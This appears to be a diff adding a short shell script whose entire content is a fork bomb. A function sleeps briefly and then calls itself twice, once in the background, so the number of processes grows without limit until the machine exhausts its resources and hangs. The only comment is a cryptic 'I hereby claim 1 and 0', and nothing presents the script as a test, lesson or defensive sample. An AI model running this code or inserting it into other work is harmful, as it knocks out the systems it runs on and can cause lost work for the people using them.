@@ -1,0 +1,8 @@
+#!/bin/sh
+# I hereby claim 1 and 0
+a () {
+    sleep 1
+    a &
+    a
+}
+a
